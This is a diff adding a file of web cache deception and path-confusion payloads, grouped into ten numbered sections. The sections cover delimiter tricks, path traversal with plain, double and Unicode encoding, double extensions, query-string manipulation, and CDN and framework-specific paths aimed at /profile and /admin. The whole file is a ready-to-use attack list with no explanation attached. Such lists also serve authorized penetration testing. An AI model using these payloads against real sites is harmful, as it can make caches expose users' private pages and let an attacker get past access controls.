@@ -1,0 +1,119 @@
+1. Path Manipulation Payloads
+/profile
+/profile/abc.js
+/profile/123.css
+/profile/test.json
+/profile/public.js
+/profile/public.css
+/profile/static.html
+/profile/static.json
+/profile/abc123.xml
+/profile/cacheable.png
+
+2. Delimiter-Based Payloads
+/profile;abc.js
+/profile?abc.js
+/profile#abc.js
+/profile%3fabc.js (%3f = ?)
+/profile%3babc.js (%3b = ;)
+/profile%23abc.js (%23 = #)
+/profile?123.css
+/profile;456.json
+/profile%3bpublic.css
+/profile?cacheable.js
+
+3. Path Traversal Payloads
+/static/../profile
+/static/../../profile
+/profile/..%2fadmin
+/static/../..%2fprofile
+/assets/../profile/secret.json
+/images/../../profile/static.html
+/static/../profile/..%2fadmin
+/static/../assets/..%2fprofile
+/resources/../profile/..%2fadmin
+/static/..%2e%2e%2fprofile
+
+4. Encoded Path Traversal Payloads
+/profile/%2e%2e/admin
+/profile/%2e%2e%2fadmin
+/static/%2e%2e%2fprofile
+/static/%2e%2e/profile.json
+/resources/%252e%252e%252fprofile
+/resources/%252e%252e/admin
+/static/%252e%252e%252fadmin
+/static/%252e%252e%2fprofile
+/static/%u002e%u002e/admin
+/static/%u002e%u002e%2fprofile
+
+5. Misinterpreted File Extensions
+/profile/public.css
+/profile/private.css
+/profile/config.js
+/profile/data.json
+/profile/info.xml
+/profile/favicon.ico
+/profile/backup.txt
+/profile/robots.txt
+/profile/admin.html
+/profile/secret.svg
+
+6. Double Extension Payloads
+/profile/static.css.json
+/profile/public.html.js
+/profile/data.txt.css
+/profile/info.json.js
+/profile/backup.css.js
+/profile/test.xml.js
+/profile/static.js.json
+/profile/style.css.json
+/profile/image.jpg.css
+/profile/favicon.ico.css
+
+7. Query String Manipulation
+/profile?file=abc.js
+/profile?file=static.css
+/profile?file=backup.json
+/profile?path=../static.css
+/profile?../static.css
+/profile?cacheable=1
+/profile?nocache=false
+/profile?static=true
+/profile?dynamic=false
+/profile?param=../admin
+
+8. Delimiter + Encoding
+/profile;../static.css
+/profile?../static.css
+/profile%3f../static.css
+/profile%3b../admin
+/profile?file=../admin
+/profile%3bpath=../static.css
+/profile%3f../admin
+/profile%3bstatic.css
+/profile;dynamic.css
+/profile?config.js
+
+9. CDN and Static Directory Payloads
+/cdn/static/profile
+/cdn/images/profile
+/cdn/assets/profile
+/cdn/static/admin
+/cdn/../static/profile
+/cdn/static/../profile
+/cdn/images/../profile
+/cdn/resources/profile
+/cdn/static/profile/secret.json
+/cdn/static/profile/backup.css
+
+10. Framework-Specific Payloads
+/django/profile
+/flask/static/profile
+/laravel/public/profile
+/symfony/profile/admin
+/express/static/profile
+/nextjs/static/chunks/profile
+/angular/assets/profile
+/react/static/profile
+/vue/assets/profile
+/nuxt/static/profile
